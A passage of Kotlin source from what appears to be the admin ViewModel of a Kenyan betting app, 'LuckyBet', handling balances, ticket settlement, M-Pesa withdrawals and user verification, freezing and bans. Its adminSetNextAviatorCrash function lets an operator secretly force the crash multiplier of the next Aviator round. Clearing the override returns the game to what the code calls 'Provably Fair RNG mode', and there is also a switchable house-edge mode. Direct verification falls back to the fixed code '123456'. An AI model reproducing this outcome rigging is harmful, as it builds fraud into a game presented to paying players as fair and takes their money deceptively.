            showMessage("Set ${user.phoneNumber} balance to KES ${String.format(Locale.US, "%,.2f", exactBalance.coerceAtLeast(0.0))}")
        }
    }

    fun adminSetNextAviatorCrash(multiplier: Double?) {
        viewModelScope.launch {
            val current = repository.getSiteConfigOnce()
            repository.updateSiteConfig(current.copy(nextForcedAviatorCrash = multiplier))
            if (multiplier != null) {
                showMessage("Admin Override: Next Aviator round will crash at ${String.format(Locale.US, "%.2fx", multiplier)}!")
            } else {
                showMessage("Aviator returned to Provably Fair RNG mode.")
            }
        }
    }

    fun adminSetAviatorHouseMode(mode: String) {
        viewModelScope.launch {
            val current = repository.getSiteConfigOnce()
            repository.updateSiteConfig(current.copy(aviatorHouseEdgeMode = mode))
            showMessage("Aviator Engine Mode updated to $mode")
        }
    }

    fun adminUpdatePromoBanner(bannerText: String) {
        viewModelScope.launch {
            val current = repository.getSiteConfigOnce()
            repository.updateSiteConfig(current.copy(promoBannerText = bannerText))
            showMessage("Site promo banner updated!")
        }
    }

    fun adminSaveMatch(match: MatchEntity) {
        viewModelScope.launch {
            repository.addOrUpdateMatch(match)
            showMessage("Match saved: ${match.homeTeam} vs ${match.awayTeam}")
        }
    }

    fun adminDeleteMatch(matchId: Int) {
        viewModelScope.launch {
            repository.deleteMatch(matchId)
            showMessage("Fixture removed from sportsbook.")
        }
    }

    fun adminSettleTicket(ticket: BetTicketEntity, newStatus: String) {
        viewModelScope.launch {
            val previousStatus = ticket.status
            repository.updateBetTicket(ticket.copy(status = newStatus))
            if (newStatus == "WON" && previousStatus != "WON") {
                val targetUser = repository.getUserByPhone(ticket.userPhone)
                if (targetUser != null) {
                    repository.updateUserBalance(targetUser.phoneNumber, targetUser.balance + ticket.potentialPayout)
                }
                repository.insertTransaction(
                    WalletTransactionEntity(
                        mpesaCode = "WIN-${ticket.ticketCode}",
                        phoneNumber = ticket.userPhone,
                        type = "BET_WIN",
                        amount = ticket.potentialPayout,
                        status = "COMPLETED"
                    )
                )
                showMessage("Ticket ${ticket.ticketCode} settled as WON! Credited KES ${String.format(Locale.US, "%,.0f", ticket.potentialPayout)} to ${ticket.userPhone}")
            } else {
                showMessage("Ticket ${ticket.ticketCode} marked as $newStatus")
            }
        }
    }

    fun adminResolveWithdrawal(tx: WalletTransactionEntity, approve: Boolean) {
        if (tx.status != "PENDING") return
        viewModelScope.launch {
            if (approve) {
                repository.updateTransaction(tx.copy(status = "COMPLETED"))
                showMessage("M-Pesa Withdrawal ${tx.mpesaCode} Approved!")
            } else {
                val refund = kotlin.math.abs(tx.amount)
                val targetUser = repository.getUserByPhone(tx.phoneNumber)
                if (targetUser != null) {
                    repository.updateUserBalance(targetUser.phoneNumber, targetUser.balance + refund)
                }
                repository.updateTransaction(tx.copy(status = "REJECTED"))
                showMessage("Withdrawal ${tx.mpesaCode} Rejected & Refunded to ${tx.phoneNumber}.")
            }
        }
    }

    fun adminGenerateVerificationCode(phoneRaw: String) {
        val phone = normalizePhone(phoneRaw)
        val newCode = (100000..999999).random().toString()
        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                showMessage("No user found with phone $phone.")
                return@launch
            }
            repository.setUserVerification(phone, newCode, user.isVerified)
            showMessage("Verification Code generated for ${user.fullName} ($phone): $newCode")
        }
    }

    fun adminVerifyUserDirectly(phoneRaw: String) {
        val phone = normalizePhone(phoneRaw)
        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                showMessage("No user found with phone $phone.")
                return@launch
            }
            repository.setUserVerification(phone, user.verificationCode.ifBlank { "123456" }, true)
            showMessage("Account for ${user.fullName} ($phone) has been VERIFIED & APPROVED!")
        }
    }

    fun adminToggleFreezeUser(phoneRaw: String, currentFrozen: Boolean) {
        val phone = normalizePhone(phoneRaw)
        val newFrozen = !currentFrozen
        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                showMessage("No user found with phone $phone.")
                return@launch
            }
            repository.setUserFrozen(phone, newFrozen)
            showMessage("Account for ${user.fullName} ($phone) is now ${if (newFrozen) "FROZEN (betting & withdrawals locked)" else "UNFROZEN (active)"}!")
        }
    }

    fun adminToggleBanUser(phoneRaw: String, currentBanned: Boolean) {
        val phone = normalizePhone(phoneRaw)
        val newBanned = !currentBanned
        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                showMessage("No user found with phone $phone.")
                return@launch
            }
            repository.setUserBanned(phone, newBanned)
            val currentCfg = repository.getSiteConfigOnce()
            if (newBanned && currentCfg.loggedInUserPhone == phone) {
                repository.updateSiteConfig(currentCfg.copy(loggedInUserPhone = null))
            }
            showMessage("Account for ${user.fullName} ($phone) has been ${if (newBanned) "BANNED (login prohibited)" else "UNBANNED"}!")
        }
    }

    class Factory(private val repository: LuckyBetRepository) : ViewModelProvider.Factory {
        @Suppress("UNCHECKED_CAST")
        override fun <T : ViewModel> create(modelClass: Class<T>): T {
            return LuckyBetViewModel(repository) as T
        }
    }
}
